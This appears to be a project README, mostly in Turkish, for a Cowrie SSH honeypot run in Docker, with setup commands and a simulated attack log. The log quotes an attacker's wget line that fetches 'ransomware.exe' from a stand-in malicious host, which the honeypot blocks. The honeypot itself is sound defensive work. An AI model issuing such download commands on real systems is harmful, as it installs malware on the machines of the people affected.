# Cloud-Native Honeypot & Threat Analysis Project

## 🇹🇷 Proje Özeti
Bu proje, bulut tabanlı bir ortamda (Azure Infrastructure) Docker konteyner teknolojisi kullanılarak oluşturulmuş bir **Siber Güvenlik Tuzağı (Honeypot)** uygulamasıdır.

Amaç, gerçek bir sunucuyu taklit ederek saldırgan davranışlarını analiz etmek, "Brute-Force" (Kaba Kuvvet) saldırılarını loglamak ve güvenli bir izole ortamda tehdit istihbaratı toplamaktır.

## 🛠 Kullanılan Teknolojiler
* **Cloud:** Microsoft Azure (via GitHub Codespaces)
* **Containerization:** Docker & Docker CLI
* **Security:** Cowrie (High interaction SSH Honeypot)
* **OS:** Linux (Ubuntu Server)
* **Networking:** Port Forwarding & TCP/IP Analysis

## 🚀 Nasıl Çalışır?
1.  **İzolasyon:** Sistem, ana işletim sisteminden izole bir Docker konteyneri içinde çalışır.
2.  **Aldatma (Deception):** 2223 portu üzerinden gelen istekleri karşılar ve saldırgana sahte bir dosya sistemi sunar.
3.  **Loglama:** Saldırganın denediği kullanıcı adları, şifreler ve çalıştırdığı komutlar sistem tarafından kaydedilir.
4.  **Güvenlik:** Sistem dış ağa kapalıdır, böylece saldırgan gerçek dünyada zarar veremez.

## 📊 Örnek Saldırı Logu (Kanıt)
Proje geliştirme sürecinde simüle edilen bir saldırı girişimi ve sistemin tepkisi:

> **Saldırgan:** `ssh root@localhost -p 2223` (Giriş Denemesi)
> **Sistem:** `Login attempt [root/admin123] succeeded`
>
> **Saldırgan:** `wget http://dark-web-attack.com/ransomware.exe` (Zararlı Yazılım İndirme)
> **Sistem:** `Attempt to access blocked network address` (Engellendi)

---

## 💻 Kurulum ve Kullanım (How to Run)

Bu projeyi kendi bilgisayarınızda test etmek için Docker'ın kurulu olması gerekmektedir. Aşağıdaki adımları sırasıyla uygulayın:

### Uygulamak İçin Yapılması Gerekenler
1. Tuzağı Başlatın (Start Container)
Önce Honeypot sunucusunu arka planda çalıştırın:

docker run -p 2223:2222 --name honeypot -d cowrie/cowrie

2. Saldırın (Attack Simulation)
Yeni bir terminal penceresi açın ve kurduğunuz tuzağa sızmayı deneyin:

ssh -p 2223 root@localhost
(Şifre sorulduğunda rastgele bir şifre girebilirsiniz.)

3. İzleyin (Live Monitoring)
Saldırganın (veya kendinizin) içeride ne yaptığını canlı izlemek için şu komutu girin:

docker logs -f honeypot

4. Temizleyin (Stop & Cleanup)
Test işleminiz bittiğinde tuzağı kapatmak ve silmek için:

docker rm -f honeypot
